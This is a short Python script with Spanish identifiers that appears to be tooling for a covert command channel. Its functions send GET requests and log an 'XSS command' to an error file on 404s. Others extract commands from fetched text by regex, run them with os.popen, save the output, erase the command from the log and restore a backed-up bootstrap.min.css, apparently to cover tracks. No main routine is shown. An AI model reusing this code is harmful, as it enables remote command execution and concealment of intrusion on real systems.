# -*- coding: utf-8 -*-
"""
Created on Sun Apr 14 12:11:39 2024

@author: Fan_tasma
"""
import requests
import re
import os

def obtener_solicitud_get(url, comando_xss=None):
    try:
        response = requests.get(url)
        if response.status_code == 404:
            if comando_xss:
                with open("error_log.txt", "a") as f:
                    f.write("Comando XSS agregado al registro de errores: {}\n".format(comando_xss))
        return response.text
    except Exception as e:
        print("Error al obtener la solicitud GET:", e)

def leer_registro_errores():
    try:
        with open("error_log.txt", "r") as f:
            contenido = f.read()
            print("\n== Contenido del archivo de errores ==\n")
            print(contenido)
    except FileNotFoundError:
        print("No se encontró el archivo de registro de errores.")

def recuperar_comandos(patron, texto):
    return re.findall(patron, texto)

def decodificar_y_ejecutar_comando(comando):
    try:
        output = os.popen(comando).read()
        return output
    except Exception as e:
        print("Error al ejecutar el comando:", e)

def guardar_salida_comando(output):
    with open("command_output.txt", "a") as f:
        f.write(output)

def recuperar_resultados_get(url):
    try:
        response = requests.get(url)
        return response.text
    except Exception as e:
        print("Error al recuperar resultados mediante GET:", e)

def eliminar_comando_registro(comando):
    try:
        with open("error_log.txt", "r") as f:
            lines = f.readlines()
        with open("error_log.txt", "w") as f:
            for line in lines:
                if comando not in line:
                    f.write(line)
    except FileNotFoundError:
        print("No se encontró el archivo de registro de errores.")

def restaurar_archivo_css_original():
    try:
        os.system("mv bootstrap.min.css.backup bootstrap.min.css")
    except Exception as e:
        print("Error al restaurar el archivo CSS original:", e)
